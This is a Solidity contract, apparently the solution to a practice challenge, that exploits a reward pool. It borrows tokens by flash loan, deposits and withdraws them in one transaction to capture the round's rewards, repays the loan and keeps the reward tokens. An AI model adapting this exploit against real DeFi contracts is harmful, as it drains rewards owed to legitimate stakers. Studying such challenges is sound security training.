// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import './TheRewarderPool.sol';
import './RewardToken.sol';
import './FlashLoanerPool.sol';

contract RewardExploit {
    TheRewarderPool private rewarderPool;

    FlashLoanerPool private flashLoanerPool;

    RewardToken private rewardToken;

    constructor(address rewarderPoolAddress, address flashLoanerPoolAddress) {
        rewarderPool = TheRewarderPool(rewarderPoolAddress);
        flashLoanerPool = FlashLoanerPool(flashLoanerPoolAddress);
        rewardToken = RewardToken(rewarderPool.rewardToken());
    }

    function depleteFunds(uint256 flashLoanAmount) external {
        // Perform flash loan, which mints accounting tokens
        // and distributes all the reward of this round to us
        flashLoanerPool.flashLoan(flashLoanAmount);

        // Transfer tokens back to us
        uint256 reward = rewardToken.balanceOf(address(this));
        require(reward > 0, 'Zero reward');
        rewardToken.transfer(msg.sender, reward);
    }

    function receiveFlashLoan(uint256 amount) external {
        // Deposit liquidity tokens to mint accounting tokens
        flashLoanerPool.liquidityToken().approve(address(rewarderPool), amount);
        rewarderPool.deposit(amount);

        // Get liquidity tokens back
        rewarderPool.withdraw(amount);

        // Pay back flash loan
        flashLoanerPool.liquidityToken().transfer(msg.sender, amount);
    }
}
